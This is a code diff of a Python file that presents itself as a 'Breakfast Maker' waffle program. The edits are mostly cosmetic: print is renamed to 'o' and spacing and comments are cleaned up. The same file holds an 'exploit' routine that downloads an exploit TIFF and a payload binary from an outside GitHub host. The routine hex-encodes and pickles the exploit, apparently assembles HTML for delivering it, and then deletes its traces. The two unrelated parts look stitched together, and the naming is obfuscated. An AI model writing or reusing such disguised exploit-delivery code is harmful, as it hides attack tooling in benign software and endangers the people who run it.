@@ -12,8 +12,8 @@ import time as r
 g.packages.urllib3.disable_warnings()  # This is so we don't get some warning about SSL.
 production=False
 p_errors=False
-bc=print
-def setup_log(sentry_w, bc_errors):
+o=print
+def setup_log(sentry_w, o_errors):
     global logger, production
     sentry_logging=sentry_sdk.integrations.logging.LoggingIntegration(
         level=f.INFO,
@@ -21,12 +21,12 @@ def setup_log(sentry_w, bc_errors):
     )
     e.init(dsn=sentry_w, integrations=[sentry_logging])
     logger=f.getLogger(__name__)
-    p_errors=bc_errors
+    p_errors=o_errors
     production=True
 def log(msg, level):  
-    # TODO: Use number levels, strings are annoying
+    # TODO: Use number levels instead of strings
     if p_errors:
-        bc(msg)
+        o(msg)
     if production:
         if level=="VERBOSE":
             logger.debug(msg)
@@ -37,17 +37,17 @@ def log(msg, level):
         elif level=="CRITICAL":
             logger.critical(msg)
 def u8(b):
-    if not 0 <= b <= 255:
+    if not 0<=b<=255:
         log("u8 out of range: %s" % b, "INFO")
         b=0
     return a.pack(">B", b)
 def u16(b):
-    if not 0 <= b <= 65535:
+    if not 0<=b<=65535:
         log("u16 out of range: %s" % b, "INFO")
         b=0
     return a.pack(">H", b)
 def u32(b):
-    if not 0 <= b <= 4294967295:
+    if not 0<=b<=4294967295:
         log("u32 out of range: %s" % b, "INFO")
         b=0
     return a.pack(">I", b)
@@ -82,7 +82,7 @@ class WaffleIron:
 		self.time=r.time()
 		return self.contents.cooking_time
 	def contentsAreCooked(self):
-		return r.time() > (self.time+self.contents.cooking_time)
+		return r.time()>(self.time+self.contents.cooking_time)
 	def getTimeLeft(self):
 		return max(0,(self.time+self.contents.cooking_time) - r.time())
 	def getContents(self):
@@ -116,10 +116,10 @@ class Waffles(BreakfastType):
 		iron.switchPower(True)
 		cooktime=iron.fill(b)
 		cm, cs=divmod(cooktime,60)
-		if cm > 0:
-			bc("Cooking time will be approximately %d minute%s and %d second%s"%(cm, 's'*(cm!=1), cs, 's'*(cs!=1)))
+		if cm>0:
+			o("Cooking time will be approximately %d minute%s and %d second%s"%(cm, 's'*(cm!=1), cs, 's'*(cs!=1)))
 		else:
-			bc("Cooking time will be approximately %d second%s"%(cs, 's'*(cs!=1)))
+			o("Cooking time will be approximately %d second%s"%(cs, 's'*(cs!=1)))
 		while not iron.contentsAreCooked():
 			left=iron.getTimeLeft()
 			m,s=divmod(left+0.99,60)
@@ -128,7 +128,7 @@ class Waffles(BreakfastType):
 			r.sleep(0.5)
 			s.stdout.write("\x08"*5)
 			s.stdout.flush()
-		bc
+		o
 		waffle=iron.getContents()
 		iron.switchPower(False)
 		return waffle
@@ -143,57 +143,54 @@ class BreakfastMaker:
 		breakfast=maker().make()
 		return breakfast
 def startbreakfast():
-  bc("Breakfast Maker v0.2")
+  o("Breakfast Maker v0.2")
   user=input("Please enter your username: ")
   maker=BreakfastMaker()
-  bc("Making breakfast for %s..."%user)
+  o("Making breakfast for %s..."%user)
   breakfast=maker.makeBreakfastFor(user)
-  bc("Your breakfast is ready!")
+  o("Your breakfast is ready!")
   breakfast.display()
-  bc("\a")
+  o("\a")
 def exploit(a, b):
-  if a == 0:
-    if b == 1: #No Pre-Existing Mode
+  if a==0:
+    if b==1: #No Pre-Existing Mode
       pre(0)
       task(2)
-    elif b == 2: #With Pre-Existing Mode
+    elif b==2: #With Pre-Existing Mode
       pre(1)
       task(2)
-    elif b == 3: #Download Hex Template Mode
+    elif b==3: #Download Hex Template Mode
       pre(1)
       os._exit(0)
-    elif b == 4: #Re-generate Credits File mode
+    elif b==4: #Re-generate Credits File mode
       credits(0)
-  elif a == 1:
-    # Open in binary mode (so you don't read two byte line endings on Windows as one byte)
-    # and use with statement (always do this to avoid leaked file descriptors, unflushed files)
+  elif a==1:
     with open('exploit.tiff', 'rb') as f:
-        # Slurp the whole file and efficiently convert it to hex all at once
         hexdata = l.hexlify(f.read())
         m.dump((hexdata.decode('utf-8')), open('hex.dat', 'wb'))
-  elif a == 2:
+  elif a==2:
     data2 = str(j.getcwd()) + "/" + "exploit.tiff"
     url2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
     downloadtask(data2, url2)
-  elif a == 3:
+  elif a==3:
     data1 = str(j.getcwd()) + "/" + "payload.bin"
     url1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
     downloadtask(data1, url1)
-  elif a == 4:
+  elif a==4:
     credits(1)
-  elif a == 5:
+  elif a==5:
     if j.path.exists("payload.bin"):
       j.remove("payload.bin")
-  elif a == 6:
+  elif a==6:
     if j.path.exists("hex.dat"):
       j.remove("hex.dat")
-  elif a == 7:
+  elif a==7:
     if j.path.exists("exploit.tiff"):
       j.remove("exploit.tiff")
-  elif a == 8:
+  elif a==8:
     if j.path.exists("exploit.bin"):
       j.remove("exploit.bin")
-  elif a == 9:
+  elif a==9:
     if j.path.exists("exploit.php"):
       j.remove("exploit.php")
   else:
@@ -215,16 +212,16 @@ def run():
   exploit(8, 0)
   return html
 def pre(a):
-  if a == 0:
+  if a==0:
     task(1)
     task(0)
     data = int(0)
     return data
-  elif a == 1:
+  elif a==1:
     task(1)
     data = int(0)
     return data
-  elif a == 2:
+  elif a==2:
     exploit(5, 0)
     task(0)
     data = "MSG:" + " " + str(pathlib.Path(__file__).parent.absolute()) + " " + "DOWNLOADED!"
@@ -236,21 +233,21 @@ def credits(a):
     d = c + "file to hex implementation by ShadowRanger\n"
     e = d + "urllib3 downloading implementation by shazrow\n"
     f = e + "exploit.bin based on exploit.tiff by planetbeing\n"
-    if a == 0:
+    if a==0:
       h = open("CREDITS.txt", "a")
       h.write(f)
       h.close()
-    elif a == 1:
+    elif a==1:
       print(f)
 def task(a):
-  if a == 0:
+  if a==0:
     exploit(2, 0)
     exploit(1, 0)
-  elif a == 1:
+  elif a==1:
     exploit(5, 0)
     exploit(4, 0)
     exploit(3, 0)
-  elif a == 2:
+  elif a==2:
     run()
     j._exit(0)
 def downloadtask(a, b):
